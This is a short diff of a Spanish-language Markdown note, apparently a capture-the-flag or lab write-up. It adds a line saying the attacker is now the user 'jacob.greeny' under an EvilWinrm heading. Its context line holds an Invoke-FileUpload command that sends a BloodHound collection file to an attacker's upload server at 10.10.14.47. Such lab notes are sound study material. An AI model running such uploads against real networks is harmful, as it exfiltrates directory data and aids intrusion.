@@ -195,7 +195,8 @@ Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240629101749_Bloo
 ![[Pasted image 20240629143532.png]]
 
 ### EvilWinrm
-
+ahora somos el usuario `jacob.greeny`  
+![[Pasted image 20240629143740.png]]
 
 
 
